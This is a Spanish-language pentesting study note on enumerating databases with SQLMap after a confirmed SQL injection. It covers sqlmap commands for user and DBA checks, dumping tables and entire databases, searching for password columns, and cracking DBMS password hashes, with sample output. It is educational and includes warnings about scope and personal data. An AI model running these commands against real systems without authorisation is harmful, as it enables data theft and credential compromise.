---
tags:
  - Web/Red-Team
  - SQLi
  - Pentesting/Enumeracion
Descripción: "La enumeración es el corazón del ataque: una vez confirmada la inyección, SQLMap automatiza lo que a mano sería tedioso —recorrer INFORMATION_SCHEMA, volcar tablas, romper hashes—"
Fecha de actualización: 2026-06-04
Nota previa: "[[03 - Tuning del ataque]]"
Nota siguiente: "[[05 - Bypass de protecciones web con SQLMap]]"
Area: "[[SQLMap.base|SQLMap]]"
---
---

La enumeración es el corazón del ataque: una vez confirmada la inyección, SQLMap automatiza lo que a mano sería [[06 - Enumeración de la base de datos|tedioso]] —recorrer `INFORMATION_SCHEMA`, volcar tablas, romper hashes—. SQLMap mantiene un mapa de consultas por DBMS (`queries.xml`) y elige automáticamente la variante adecuada: <mark style="background: #ADCCFFA6;">la consulta *inband* (resultado en la respuesta) para UNION/error-based, y la *blind* (bit a bit) para inyecciones a ciegas</mark>. Esto explica por qué la enumeración a ciegas es lenta y la UNION instantánea.

# Enumeración básica

El arranque típico tras la detección:

| Switch | Obtiene |
| ------ | ------- |
| `--banner` | Versión del DBMS |
| `--current-user` | Usuario actual de la base de datos |
| `--current-db` | Base de datos en uso |
| `--is-dba` | Si el usuario tiene privilegios de administrador |
| `--hostname` | Hostname del servidor |

```shell-session
$ sqlmap -u "http://host/?id=1" --banner --current-user --current-db --is-dba
current user: 'root@%'
current database: 'testdb'
current user is DBA: True
```

> [!warning]+
> <mark style="background: #FFB8EBA6;">El usuario `root` de la base de datos **no** equivale al `root` del sistema operativo</mark>: solo significa privilegio máximo *dentro* del DBMS. En despliegues modernos, ese `root` de BD suele tener privilegios de SO mínimos, lo que limita la [[08 - Escritura de archivos|escritura de ficheros]] y la [[06 - Explotación del sistema operativo con SQLMap|ejecución de comandos]]. Lo mismo aplica al rol `DBA`.

# Tablas y volcado de datos

Conocida la base (`-D testdb`), se listan y vuelcan tablas:

```shell-session
$ sqlmap -u "..." -D testdb --tables
$ sqlmap -u "..." -D testdb -T users --dump
```

El volcado se guarda automáticamente en CSV (`~/.local/share/sqlmap/output/<host>/dump/`). Para acotar grandes tablas:

| Opción | Efecto |
| ------ | ------ |
| `-C name,surname` | Solo esas columnas |
| `--start=2 --stop=3` | Solo las filas 2ª a 3ª |
| `--where="name LIKE 'f%'"` | Solo filas que cumplen la condición |
| `--dump-format=SQLITE` | Vuelca a SQLite/HTML en vez de CSV |

# Volcado masivo

- `--dump -D testdb` (sin `-T`): vuelca **toda** la base.
- `--dump-all`: vuelca **todas** las bases.
- `--exclude-sysdbs`: omite las bases del sistema (poco interesantes).

> [!warning]+
> <mark style="background: #FF5582A6;">`--dump-all` es ruidoso, lento y exfiltra datos personales</mark>. En un engagement viola la regla de "demostrar sin causar daño"; en bug bounty puede infringir el alcance y la legalidad (RGPD). Vuelca solo la tabla mínima que prueba el impacto (p. ej. una fila de credenciales), nunca la base entera salvo autorización explícita.

# Explorar estructuras grandes

```shell-session
$ sqlmap -u "..." --schema            # estructura de todas las tablas
$ sqlmap -u "..." --search -T user    # tablas cuyo nombre contiene 'user'
$ sqlmap -u "..." --search -C pass    # columnas cuyo nombre contiene 'pass'
```

<mark style="background: #8000E1A6;">`--search -C pass` es un atajo de oro</mark>: localiza directamente las columnas de contraseñas en cualquier base/tabla sin recorrer todo el esquema a mano.

# Contraseñas y cracking

Al volcar una columna que parece contener hashes, SQLMap ofrece **crackearlos** por diccionario (soporta ~31 algoritmos, con un diccionario de 1,4 M de entradas de leaks). El switch `--passwords` va directo a los hashes de las cuentas del propio DBMS:

```shell-session
$ sqlmap -u "..." --passwords --batch
[*] root [1]:
    password hash: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
    clear-text password: testpass
```

> [!info]+
> El cracking integrado de SQLMap es cómodo para hashes débiles, pero limitado. <mark style="background: #FFB86CA6;">Para hashes serios, exporta (responde "store hashes to a temporary file") y usa [[John the Ripper.base|John the Ripper]] o `hashcat`</mark> con reglas y GPU: mucho más rápido y flexible. SQLMap detecta el algoritmo, lo cual ya ahorra trabajo de identificación.

> [!warning]+
> `--all --batch` ejecuta **toda** la enumeración automáticamente. Es tentador pero contraproducente: tarda muchísimo, genera ruido masivo y deja el trabajo de encontrar lo relevante entre montañas de output. Enumera dirigido (`--current-db` → `--tables` → `--dump -T` de la tabla jugosa), no a lo bruto.

Cuando un WAF o filtro bloquea los payloads de SQLMap, toca la fase de evasión: [[05 - Bypass de protecciones web con SQLMap]].
